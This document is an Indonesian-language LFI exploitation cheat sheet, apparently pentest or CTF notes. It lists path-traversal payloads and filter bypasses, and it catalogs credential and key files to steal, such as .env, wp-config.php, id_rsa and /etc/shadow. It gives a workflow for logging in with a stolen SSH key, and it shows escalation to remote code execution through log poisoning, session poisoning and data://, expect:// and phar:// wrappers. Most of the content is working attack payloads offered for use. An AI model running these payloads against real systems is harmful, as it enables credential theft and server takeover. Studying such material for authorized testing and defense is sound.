# LFI (Local File Inclusion) — Membaca File Sensitif di Server

> **Tujuan:** Mengeksploitasi kerentanan *Local File Inclusion* untuk membaca file konfigurasi, kredensial, dan kode sumber aplikasi.

---

## Penjelasan Singkat

LFI terjadi ketika aplikasi web **memasukkan path file dari input user** (parameter URL) tanpa validasi, sehingga attacker bisa membaca file apa pun di server yang boleh diakses oleh web server.

---

## Ciri-Ciri Aplikasi Rentan

- Parameter URL berisi path file: `?page=index.php`, `?lang=en`, `?template=home`.
- Path file **ditampilkan kembali** dalam response.
- Path traversal `../` tidak difilter.
- Error message menampilkan path file asli.

---

## Payload Dasar (Path Traversal)

### Baca `/etc/passwd`

```text
?page=../../../../etc/passwd
?page=....//....//....//....//etc/passwd
?page=/etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
```

> **Penjelasan:** Naik direktori (`../`) sampai ke root filesystem, lalu akses file target. Bypass double-dot filter dengan `....//`.

---

## Cheat Sheet Path Traversal

```text
Linux:
../      => 1 level up
../../   => 2 level up
../../../etc/passwd

Windows:
..\      => 1 level up
..\..\..\..\windows\win.ini
```

---

## Teknik Bypass Filter

### 1. Double Dot Slash Bypass

```text
?page=....//....//....//etc/passwd
```

> Server filter menghapus `../`, menyisakan `../` yang fungsional.

### 2. URL Encoding

```text
?page=..%2F..%2F..%2Fetc%2Fpasswd
```

> `%2F` = `/`

### 3. Double URL Encoding

```text
?page=..%252F..%252F..%252Fetc%252Fpasswd
```

> `%252F` = `%2F` (server decode dua kali).

### 4. Null Byte (PHP < 5.3.4)

```text
?page=../../../etc/passwd%00
```

> `%00` memotong string setelahnya (null byte injection).

### 5. Absolute Path

```text
?page=/etc/passwd
```

> Langsung tulis full path.

---

## Target File Penting

### Linux

```text
/etc/passwd                       # Daftar user

/var/www/.env                   # Environment aplikasi Laravel (kredensial DB)
/var/www/html/.env                # Environment aplikasi Laravel (kredensial DB)
/var/www/html/config/database.php # Konfigurasi DB Laravel (file PHP, baca via php://filter + base64 decode)
/var/www/html/bootstrap/cache/config.php # Config cache Laravel (hasil config:cache, isi .env dibaked plain text)
/var/www/html/wp-config.php       # Kredensial database WordPress

/root/.ssh/id_rsa                 # SSH private key root
/home/<user>/.ssh/id_rsa          # SSH private key user login (shell /bin/bash)
/home/<user>/.bash_history        # History command user
/home/<user>/.mysql_history       # History query MySQL (sering ada password)

/etc/shadow                       # Password hash (butuh root)
/etc/group                        # Daftar group & anggotanya (info privesc)
/etc/hosts                        # Host mapping
/etc/issue                        # Versi OS
/etc/fstab                        # Daftar mount filesystem
/etc/crontab                      # Cron job aktif (kandidat privesc)
/etc/ssh/sshd_config              # Konfigurasi SSH (port & metode auth)
/proc/self/environ                # Environment variables (sering ada credential)
/proc/self/cmdline                # Command yang sedang berjalan
/proc/version                     # Versi kernel (cari CVE)
/var/log/apache2/access.log       # Web access log (log poisoning)
/var/log/apache2/error.log        # Web error log (log poisoning)
/var/log/auth.log                 # SSH login log
/root/.my.cnf                     # Kredensial MySQL root
/home/<user>/.ssh/authorized_keys # Public key yang diizinkan login
/home/<user>/.ssh/known_hosts     # Host lain yang dikenal target (pivot)


```

> **Eksploitasi private key `id_rsa`:** Cari user login (shell `/bin/bash`) di `/etc/passwd` → baca `/home/<user>/.ssh/id_rsa` via LFI → unduh dengan `wget` → rename → `chmod 600` → login `ssh -i`. Alur lengkap & troubleshooting known_hosts: `06-report/03.5-Local File Inclusion.md`.

### Windows

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\<user>\Desktop\flag.txt
```

---

## LFI ke RCE (Remote Code Execution)

### 1. PHP Filter — Source Code Disclosure

```text
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/bootstrap/cache/config.php
```

Decode base64 → lihat source code → cari **credential DB / token JWT / path admin**.

**Target spesial Laravel — `bootstrap/cache/config.php`:** jika developer menjalankan `php artisan config:cache`, semua nilai `.env` (password DB, APP_KEY, SMTP) **dibaked plain text** ke file PHP ini. Karena file PHP dieksekusi saat di-include (isinya tidak ditampilkan), bungkus dengan `php://filter` lalu decode hasil response:

```bash
# Decode string Base64 hasil response di mesin penyerang
echo '<STRING_BASE64_HASIL_RESPONSE>' | base64 -d
```

### 2. Log Poisoning (Apache/Nginx)

**Step 1:** Inject code ke User-Agent via curl:

```bash
curl -A "[MALICIOUS_UA_WITH_CODE]" http://<TARGET>/
```

**Step 2:** Include access.log via LFI:

```text
?page=/var/log/apache2/access.log&cmd=id
```

**Cara kerja:**

```text
1. Attacker request dengan User-Agent berisi script code
2. Code ditulis ke access.log
3. LFI mengeksekusi access.log sebagai PHP
4. Parameter cmd=id dijalankan oleh web server
```

### 3. PHP Session Poisoning

**Step 1:** Login dengan username yang berisi script code.

**Step 2:** Include session file:

```text
?page=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

### 4. PHP Wrapper `data://`

```text
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

> Base64 decode dari string PHP yang mengeksekusi command `id`.

### 5. PHP Wrapper `expect://`

```text
?page=expect://id
```

> Eksekusi command langsung (jarang enabled di production).

### 6. PHP Wrapper `phar://`

```text
?page=phar://./uploads/shell.jpg/shell.php
```

> Eksekusi script dari file non-PHP yang sudah di-upload.

---

## Discovery LFI (Cara Menemukan)

### 1. Cek Parameter Berisiko

```text
page=, file=, include=, path=, template=, view=, content=, doc=, lang=, dir=
```

### 2. Fuzzing Parameter

**ffuf** — brute force nama parameter dengan wordlist:

```bash
ffuf -u "http://<TARGET>/index.php?FUZZ=test" -w /usr/share/wordlists/dirb/common.txt -mc 200 -fs 0
```

**Arjun** — deteksi parameter tersembunyi via analisis response (lebih akurat dari brute force):

```bash
# Install (direkomendasikan pipx; jika python versi lama gunakan pip)
pipx install arjun

# Scan parameter GET (default)
arjun -u http://<TARGET>/index.php?

# Scan parameter POST
arjun -u http://<TARGET>/index.php? -m POST

# Scan body JSON (untuk API endpoint)
arjun -u http://<TARGET>/api -m JSON

# Scan banyak target sekaligus (file text / export Burp / raw request)
arjun -i targets.txt

# Sertakan parameter wajib yang sudah diketahui (dikirim di setiap request)
arjun -u http://<TARGET>/index.php? --include 'page=index'

# Mode stabil (thread=1 + delay acak 6-12 detik, untuk target yang rate-limit)
arjun -u http://<TARGET>/index.php --stable

# Simpan hasil ke file JSON
arjun -u http://<TARGET>/index.php -oJ hasil.json
```

> **Bedanya:** ffuf menebak nama parameter dari wordlist dan hanya melihat status/size response. Arjun mengirim nilai berbeda pada kandidat parameter lalu membandingkan perbedaan response — parameter valid tetap terdeteksi walau responsenya tidak berubah secara kasat mata. Sangat berguna untuk menemukan parameter LFI tersembunyi (mis. `?file=`, `?doc=`) yang tidak terlihat di URL aplikasi.

### 3. Nikto

```bash
nikto -h http://<TARGET>
```

---

## Tabel Ringkasan LFI

| Teknik | Tujuan |
|--------|--------|
| `?page=../../../etc/passwd` | Path traversal dasar |
| `?page=....//....//etc/passwd` | Bypass filter `../` |
| `?page=..%2F..%2Fetc%2Fpasswd` | URL encoding |
| `?page=php://filter/...` | Source code disclosure |
| `?page=/var/log/apache2/access.log&cmd=id` | Log poisoning RCE |
| `?page=data://text/plain;base64,...` | PHP wrapper RCE |
| `?page=phar://./uploads/...` | Phar wrapper RCE |

---

## Catatan Penting

- **Cek permission**: User web server (`www-data`) hanya bisa baca file yang readable.
- **Shadow file butuh root**: `/etc/shadow` biasanya 640, gagal dengan www-data.
- **Log poisoning**: Inject User-Agent hanya berfungsi jika log bisa ditulis oleh proses web.
- **Session poisoning**: User harus login agar session dibuat di server.
- **Null byte sudah jarang**: Hanya bekerja di PHP < 5.3.4.

---

## Checklist LFI

- [ ] Identifikasi parameter berisiko (`?page=`, `?file=`, `?lang=`).
- [ ] Fuzzing parameter tersembunyi dengan Arjun (`arjun -u http://<TARGET>`).
- [ ] Test path traversal (`../../../etc/passwd`).
- [ ] Test bypass filter (`....//`, URL encoding).
- [ ] Baca file sensitif (`/etc/passwd`, `/proc/self/environ`).
- [ ] Coba PHP filter untuk source code disclosure.
- [ ] Escalate ke RCE (log poisoning, session poisoning, php://).
- [ ] Cari credential di source code atau lateral movement.

---

## Referensi

- [OWASP – Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings – LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PHP Wrappers Cheat Sheet](https://www.php.net/manual/en/wrappers.php)
